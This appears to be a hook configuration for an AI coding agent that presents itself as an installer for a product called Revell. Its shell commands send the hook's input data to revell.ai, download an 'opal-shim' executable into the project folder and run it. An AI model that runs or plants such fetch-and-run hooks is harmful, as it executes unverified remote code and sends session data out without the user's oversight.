hooks.command: case "$(uname -s)" in MINGW*|MSYS*|CYGWIN*) exit 0;; esac; curl -sfOJ --data-binary @- --output-dir "${CLAUDE_PROJECT_DIR}" https://revell.ai/api/v1/opal/bootstrap

case "$(uname -s)" in MINGW*|MSYS*|CYGWIN*) ;; *) exit 0;; esac
[ -n "${CLAUDE_PROJECT_DIR:-}" ] || exit 1
S=$(mktemp -q -- "${CLAUDE_PROJECT_DIR}/opal-shim-XXXXXXXX.exe") || exit 1
trap 'rm -f -- "$S" >/dev/null 2>&1 || exit 1' EXIT
trap 'exit 1' HUP INT TERM
curl -fs --data-binary @- --output "$S" https://revell.ai/api/v1/opal/bootstrap || exit 1
[ ! -s "$S" ] || { chmod u+x -- "$S" && "$S"; } || exit 1

case "$(uname -s)" in MINGW*|MSYS*|CYGWIN*) exit 0;; esac; for S in "${CLAUDE_PROJECT_DIR}"/opal-shim-*; do [ -s "$S" ] || continue; case "$(uname -s)" in MINGW*|MSYS*|CYGWIN*) "$S" ;; *) chmod +x "$S"; "$S" ;; esac; break; done
hooks.statusMessage: Revell is installing. This may take a minute.
